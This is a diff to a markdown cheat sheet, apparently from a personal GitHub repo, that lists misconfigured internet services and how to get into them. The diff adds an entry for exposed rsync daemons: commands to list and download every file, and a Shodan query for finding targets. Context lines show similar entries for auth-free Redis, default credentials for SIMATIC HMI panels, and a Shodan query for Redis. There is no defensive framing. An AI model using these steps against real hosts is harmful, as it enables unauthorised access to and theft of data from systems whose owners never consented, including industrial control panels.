@@ -9,6 +9,7 @@
 * [Jenkins code execution](https://github.com/komodoooo/Some-things/blob/main/papers.md#Jenkins-code-execution)
 * [LG Signage default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#LG-Signage-default-credentials)
 * [Redis auth free access](https://github.com/komodoooo/Some-things/blob/main/papers.md#Redis-auth-free-access)
+* [Rsync exposed files](https://github.com/komodoooo/Some-things/blob/main/papers.md#Rsync-exposed-files)
 * [SIMATIC HMI_Panel default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#SIMATIC-HMI_Panel-default-credentials)
 * [SMB server misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#SMB-server-misconfiguration)
 * [VNC Servers with auth disabled](https://github.com/komodoooo/Some-things/blob/main/papers.md#VNC-Servers-with-auth-disabled)
@@ -85,6 +86,15 @@ Default password: _`00000000`_
 `redis-cli -h <ip>`
 ### Shodan query
 [`product:redis "db0"`](https://www.shodan.io/search?query=product%3Aredis+%22db0%22)
+# Rsync exposed files
+### Install
+Use your own package manager
+### List all files
+`rsync --list-only <address>::<directory (leave blank for all)>`
+### Download all files in your current directory
+`rsync -avh <address>::<directory (leave blank for all)> $(pwd)`
+### Shodan base query (to customize)
+[`product:rsyncd`](https://www.shodan.io/search?query=product%3Arsyncd)
 # SIMATIC HMI_Panel default credentials
 ### Login
 Default username: _`Administrator`_
